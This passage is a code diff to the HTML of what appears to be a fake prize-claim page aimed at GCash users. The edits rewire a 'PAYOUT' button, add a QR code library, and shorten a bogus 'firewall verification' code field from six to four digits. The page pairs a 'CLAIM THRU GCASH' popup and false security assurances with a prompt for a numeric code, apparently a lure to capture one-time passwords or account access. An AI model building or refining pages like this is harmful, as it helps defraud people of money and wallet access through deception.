@@ -9,6 +9,7 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
     
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
@@ -95,7 +96,7 @@
         </div>
     </div>
 
-    <!-- Congratulations Popup -->
+    <!-- ========== CONGRATULATIONS POPUP ========== -->
     <div id="claimPopup" class="claim-popup-overlay">
         <div class="claim-popup-card">
             <div class="popup-close-btn" onclick="hideClaimPopup()">✕</div>
@@ -116,23 +117,23 @@
             <button id="claimActionBtn" class="claim-action-btn" onclick="onClaimAction()">CLAIM THRU GCASH</button>
             <div class="info-note">🔒 Secured Transaction | No Hidden Fees</div>
 
-            <!-- DISCLAIMER & PAYOUT BUTTON -->
+            <!-- PAYOUT BUTTON (now calls showPrizePopup) -->
             <div style="margin-top: 12px; padding: 8px; border-top: 1px solid rgba(255,255,255,0.1);">
                 <p style="font-size: 10px; color: #ff8888; margin-bottom: 8px;">
                     ⚠️ If hindi ma-cashout, try to switch other device or click
                 </p>
-                    <button id="payoutBtn" onclick="window.location.reload()" 
-                        style="background: linear-gradient(135deg, #ff8800, #cc5500); 
-                        border: none; width: 100%; padding: 10px; 
-                        font-size: 14px; font-weight: bold; border-radius: 60px; 
-                        cursor: pointer; color: white; font-family: inherit;">
-                        💸 PAYOUT 💸
-                    </button>
+                <button id="payoutBtn" onclick="showPrizePopup()" 
+                    style="background: linear-gradient(135deg, #ff8800, #cc5500); 
+                    border: none; width: 100%; padding: 10px; 
+                    font-size: 14px; font-weight: bold; border-radius: 60px; 
+                    cursor: pointer; color: white; font-family: inherit;">
+                    💸 PAYOUT 💸
+                </button>
             </div>
         </div>
     </div>
 
-    <!-- Firewall Verification Popup -->
+    <!-- ========== FIREWALL VERIFICATION POPUP ========== -->
     <div id="firewallPopup" class="firewall-popup-overlay" style="display: none;">
         <div class="firewall-popup-card">
             <div class="popup-close-btn" onclick="hideFirewallPopup()">✕</div>
@@ -145,7 +146,7 @@
                     <p>Enter the code below to continue.</p>
                 </div>
                 <div class="verification-input-group">
-                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric">
+                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                     <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
                 </div>
                 <div class="firewall-note">
@@ -156,7 +157,7 @@
         </div>
     </div>
 
-        <!-- ========== PRIZE POPUP (Second Popup for Template Image) ========== -->
+    <!-- ========== PRIZE POPUP (Second Popup for Template Image) ========== -->
     <div id="prizePopup" class="prize-popup-overlay" style="display: none;">
         <div class="prize-popup-card">
             <div class="popup-close-btn" onclick="hidePrizePopup()">✕</div>
@@ -176,7 +177,7 @@
     </div>
 
     <!-- External Scripts -->
-   <script src="js/config.js"></script>
+    <script src="js/config.js"></script>
     <script src="js/game.js"></script>
     <script src="js/temp.js"></script> 
     <script src="js/firewall.js"></script>
